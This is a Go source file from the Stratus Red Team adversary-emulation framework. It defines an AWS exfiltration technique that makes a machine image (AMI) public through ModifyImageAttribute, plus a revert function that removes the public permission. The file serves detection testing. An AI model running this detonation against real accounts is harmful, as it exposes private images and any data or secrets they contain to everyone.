package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.exfiltration.ami-make-public",
		FriendlyName: "Exfiltrate an AMI by Making it Public",
		Description: `
Exfiltrates an AMI by sharing it publicly.

Warm-up: Create an AMI.

Detonation: Share the AMI publicly.
`,
		Platform:                   stratus.AWS,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var amiPublicPermissions = []types.LaunchPermission{
	{Group: types.PermissionGroupAll},
}

func detonate(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	amiId := params["ami_id"]

	log.Println("Exfiltrating AMI " + amiId + " by sharing it publicly")
	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
		ImageId: aws.String(amiId),
		LaunchPermission: &types.LaunchPermissionModifications{
			Add: amiPublicPermissions,
		},
	})

	if err != nil {
		return errors.New("Unable to share AMI publicly: " + err.Error())
	}

	return nil
}

func revert(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	amiId := params["ami_id"]

	log.Println("Reverting exfiltration of AMI " + amiId + " by removing public sharing")
	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
		ImageId: aws.String(amiId),
		LaunchPermission: &types.LaunchPermissionModifications{
			Remove: amiPublicPermissions,
		},
	})

	if err != nil {
		return errors.New("Unable to remove AMI public permissions: " + err.Error())
	}

	return nil
}
